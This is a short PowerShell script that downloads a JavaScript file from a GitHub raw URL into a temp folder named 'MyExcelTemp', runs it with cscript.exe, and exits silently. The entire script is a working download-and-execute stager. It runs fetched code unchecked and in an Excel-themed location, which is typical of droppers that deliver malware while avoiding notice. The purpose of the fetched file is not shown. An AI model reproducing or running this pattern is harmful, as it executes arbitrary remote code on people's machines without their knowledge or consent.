<#
.SYNOPSIS
    Downloads and executes a JavaScript (.js) file in %TEMP%\MyExcelTemp.
.DESCRIPTION
    This script downloads a specified .js file, runs it using cscript, and exits silently.
.NOTES
    Requires PowerShell 3.0 or later.
#>

# Use the temp folder path
$folderPath = "$env:TEMP\MyExcelTemp"

# Define the URL of the .js file
$jsFileURL = "https://github.com/seunoshino/myapp-downloads/raw/refs/heads/main/MyFile.js"  # Replace with your actual URL
$jsFilePath = "$folderPath\MyFile.js"

# Function to download the .js file
function Download-File {
    param (
        [string]$url,
        [string]$filePath
    )

    $webClient = New-Object System.Net.WebClient
    $webClient.DownloadFile($url, $filePath)
}

# Download the .js file
Download-File -url $jsFileURL -filePath $jsFilePath

# Check if the file was downloaded successfully
if (Test-Path $jsFilePath) {
    # Run the .js file using cscript
    Start-Process "cscript.exe" -ArgumentList "`"$jsFilePath`"" -NoNewWindow
} else {
    Write-Host "Failed to download the .js file."
}

# Exit silently
exit